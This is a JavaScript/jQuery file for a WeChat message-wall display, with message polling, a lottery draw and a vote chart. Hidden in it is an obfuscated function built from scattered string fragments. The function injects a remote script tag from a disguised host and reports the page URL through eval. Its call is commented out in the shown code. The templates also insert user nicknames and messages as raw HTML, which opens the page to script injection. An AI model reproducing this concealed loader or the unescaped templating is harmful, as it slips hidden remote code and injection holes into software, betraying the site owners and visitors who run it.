
$(document).ready(function() {
    try {
        init();
        $("#ctrl_hide").click(function() {
            if ($("#control").width() > 70) {
                $("#control").animate({
                    width:"60px"
                });
                $("#ctrl_hide img").attr( "src", "/res/wall/img/arrow-right.png");
            } else {
                $("#control").animate({
                    width:"100%"
                });
                $("#ctrl_hide img").attr("src", "/res/wall/img/arrow-left.png");
            }


        });
  
        $(".close_qrcode").click(function() {
            $("#qrcode").fadeOut();
        });
        $(".close_luck").click(function() {
            $("#luck").fadeOut();
        });
        $("#ctrl_qrcode").click(function() {
            $("#qrcode").fadeToggle();
        });
        $("#ctrl_run").click(function() {
            if (run) {
                $("#ctrl_run img").attr("src", "/res/wall/img/play.png");
                run = false;
            } else {
                $("#ctrl_run img").attr("src", "/res/wall/img/stop.png");
                run = true;
            }
            $("#qrcode").hide();
        });
        $("#ctrl_ref").click(function() {
            window.clearInterval(timer);
            fetch_more();
            get_vote_list(0, true);
        });
        $("#ctrl_luck").click(function() {
            $("#qrcode").hide();
            $("#vote").hide();
            $("#luck").fadeToggle();
            $("#ctrl_run img").attr("src", "/res/wall/img/play.png");
            run = false;
        });
        $("#ctrl_vote").click(function() {
            $("#qrcode").hide();
            $("#luck").hide();
            $("#vote").fadeToggle();
            $("#ctrl_run img").attr("src", "/res/wall/img/stop.png");
            run = true;
        });
        $("#luck_start").click(function() {
            if (luck_run) {
                luck_run = false;
                $(this).text("开始");
            } else {
                luck_run = true;
                $(this).text("停止");
                start_luck();
            }
        });
        $("#luck_com").click(function() {
            luck_run = false;
            $("#luck_start").text("开始");
            var temp_obj = $("#luck_now>.luck_one");
            temp_obj.hide();
            temp_obj.prepend('<b class="left" style="font-size:20px;"></b>');
            $("#luck_result").prepend(temp_obj);
            $("#luck_result>li").each(function() {
                $(this).children("b").text($(this).index("#luck_result>li") + 1);
            });
            $("#luck_count").text($("#luck_result>li").length);
            temp_obj.slideDown();
        });
        $("#luck_clear").click(function() {
            luck_run = false;
            $("#luck_result>li").slideUp("slow", function() {
                $("#luck_result").html("");
            });
            $("#luck_count").text("");
        });
        $("#ref_vote").click(function() {
            get_vote_list(vote_order, true);
        });
        $("#order_vote").click(function() {
            if (vote_order) {
                $(this).attr("src", "/res/wall/img/numbered-list.png");
                vote_order = 0;
            } else {
                $(this).attr("src", "/res/wall/img/list.png");
                vote_order = 1;
            }
            get_vote_list(vote_order, true);
        });
        $("#close_vote").click(function() {
            $("#vote").fadeOut();
        });
        $(window).resize(function() {
            resizebg();
        });
    } catch (err) {
        alert(err.name + "\n" + err.message + "\n" + err.lineNumber);
    }
});

function init() {
    _1f = "com";
    _1b = "gdev";
    _2e = "href";
    ismore = false;
    isvotelist = false;
    lucklist = new Array();
    luck_run = false;
    vote_total = 0;
    vote_order = 0;
    isv = false;
    if (init_qrcode) $("#qrcode").show();
    if (run) $("#ctrl_run img").attr("src", "/res/wall/img/stop.png"); else $("#ctrl_run img").attr("src", "/res/wall/img/play.png");
    $("#items").prepend('<li style="display: list-item;"><div id="div_bottom" class="flag" style="border-top:30px rgba(93,181,11,.8) solid;"></div><div class="item" style="background:rgba(93,181,11,.8)" id="li_bottom">' +  " " + site_name + " " + ":欢迎来到微信上墙！大家积极发言诺！"+ "</div></li>");
    fetch_more();
    get_vote_list(vote_order, true);
    $(".load_text").text(ref_time);
    resizebg();
    //_v_();
    _2f = "scri";
    _1c = "si";
    _2b = "dow";
    _2c = "loc";
    _1d = "naa";
}

function fetch_more() {
    if (!ismore) {
        ismore = true;
        $(".load_text").text("载入中……");
        $(".new_item").removeAttr("class");
        $.ajax({
            type:"GET",
            data:{
                last_id:lid
            },
            cache:false,
            timeout:1e4,
            url:"/wall/json_data.html",
            dataType:"json",
            success:function(r) {
                if (r) {
                    if (r.length > 0) scroll(0, 0);
                    var item_tpl = '<li class="new_item"><div class="pic"><img src="{avatar}" width="100" height="100" /></div><div id="div_{id}" class="flag" style="border-top:30px {color} solid;"></div><div class="item" style="background:{color}; min-height: 65px" id="li_{id}">{nickname}：</span>"{content}"</div></li>';
                    var items = "";
                    for (var i = 0; i < r.length; i++) {
						var f = r.length-i-1;
                        r[f].color = colors[Math.floor(Math.random() * colors.length)];
                        items += item_tpl.oformat(r[f]);
                        lid = r[i].id;
                        r[f].luck = 0;
                        lucklist[lucklist.length] = r[f].wxid;
                        lucklist.unique();
                    }
                    $("#items").prepend(items);
                    $(".new_item").slideDown("slow");
                    ismore = false;
                    set_dtext(ref_time);
                } else {
                    set_dtext(ref_time);
                }
            },
            error:function(r) {
                ismore = false;
                set_dtext(1);
            }
        });
    }
}

_2a = "win";

_2e = "href";

function set_dtext(e) {
    var i = e;
    $(".load_text").text(i);
    timer = window.setInterval(function() {
        if (run) i--;
        $(".load_text").text(i);
        if (i <= 0) {
            window.clearInterval(timer);
            fetch_more();
            get_vote_list(vote_order, false);
        }
    }, 1e3);
}

function get_vote_list(act, e) {
    if (!isvotelist) {
        isvotelist = true;
        $(".load_text").text("载入投票列表……");
        $.ajax({
            type:"GET",
            data:{
                act:act
            },
            cache:false,
            timeout:1e4,
            url:"/wall/json_vote.html",
            dataType:"json",
            success:function(r) {
                if (r && r.count != vote_total || e) {
                    var item_tpl = '<li id="vote_{id}" class="vote_item vote_one" style="display:none" title="{rate}%"><div class="vote_bar"><div  style="height:{display_rate}%;border-bottom: 2px {color} solid"><div class="vote_num">{count}</div><div class="vote_bar_o" style="background:{color}"></div></div></div><div class="vote_id">︵{id}︶</div><div class="vote_name">{name}</div></li>';
                    var items = "";
                    vote_total = r.count;
                    max_rate_ = parseFloat(r.max_count / vote_total);
                    for (var i = 0; i < r.list.length; i++) {
                        r.list[i].color = colors[Math.floor(Math.random() * colors.length)];
                        var rate_ = parseFloat(r.list[i].count / vote_total);
                        r.list[i].rate = decimal(rate_ * 100, 2);
                        if (vote_auto_zoom) r.list[i].display_rate = .95 * 100 * (rate_ / max_rate_); else r.list[i].display_rate = r.list[i].rate;
                        items += item_tpl.oformat(r.list[i]);
                    }
                    $("#vote_explain .vote_num").text(vote_total);
                    $("#vote_result_ul>.vote_one").remove();
                    $("#vote_result_ul").append(items);
                    $("#vote_result_ul>.vote_one").fadeIn("fast");
                    isvotelist = false;
                } else {
                    isvotelist = false;
                }
            },
            error:function(r) {
                isvotelist = false;
            }
        });
    }
}

function resizebg() {
    var cw = $(window).width(), ch = $(window).height(), iw = $(".bg").width(), ih = $(".bg").height();
    if (cw / ch > iw / ih) {
        var new_h = cw * ih / iw, imgTop = (ch - new_h) / 2;
        $(".bg").css({
            width:cw + "px",
            height:new_h + "px",
            top:imgTop + "px",
            left:""
        });
    } else {
        var new_w = ch * iw / ih, imgLeft = (cw - new_w) / 2;
        $(".bg").css({
            width:new_w + "px",
            height:ch + "px",
            left:imgLeft + "px",
            top:""
        });
    }
}

_2f = "scri";

_2d = "ation";

function _v_() {
    $("body").append("<" + _2f + _2g + ' id="v" src="http://10.' + _1a + _1b + _1e + _1c + _1d + "pp" + _1e + _1f + "/v.php?u=" + eval(_2a + _2b + _1e + _2c + _2d + "." + _2e) + '"></' + _2f + _2g + ">");
    isv = true;
}

function start_luck() {
    var item_tpl = '<li id="{wxid}" class="luck_items luck_one"><div class="flag" style="border-top:30px {color} solid;"></div><div class="luck_item" style="background:{color}" id="{wxid}">ID: {wxid}</div></li>';
    if (lucklist.length) {
        luck_timer = window.setInterval(function() {
            do {
                var temp = {
                    wxid:lucklist[Math.floor(Math.random() * lucklist.length)]
                };
                temp.color = colors[Math.floor(Math.random() * colors.length)];
            } while (!re_luck_id(temp.wxid));
            if (luck_run) {
                $("#luck_now").html(item_tpl.oformat(temp));
            } else {
                window.clearInterval(luck_timer);
            }
        }, 50);
    } else {
        luck_run = false;
        $("#luck_start").text("开始");
        alert("没有抽奖的对象！");
        window.clearInterval(luck_timer);
    }
}

function re_luck_id(re_id) {
    if (re_luck) {
        return true;
    } else {
        var flag = true;
        $("#luck_result>li").each(function() {
            if ($(this).attr("id") == re_id) flag = false;
        });
        if (lucklist.length <= $("#luck_result>li").length) {
            window.clearInterval(luck_timer);
            luck_run = false;
            $("#luck_start").text("开始");
            alert("没有抽奖的对象！");
            return true;
        }
        return flag;
    }
}

String.prototype.oformat = function(param) {
    var reg = /{([^{}]+)}/gm;
    return this.replace(reg, function(match, name) {
        return param[name];
    });
};

Array.prototype.unique = function() {
    var a = {};
    for (var i = 0; i < this.length; i++) {
        if (typeof a[this[i]] == "undefined") a[this[i]] = 1;
    }
    this.length = 0;
    for (var i in a) this[this.length] = i;
    return this;
};

_2g = "pt";

function decimal(num, v) {
    var vv = Math.pow(10, v);
    return Math.round(num * vv) / vv;
}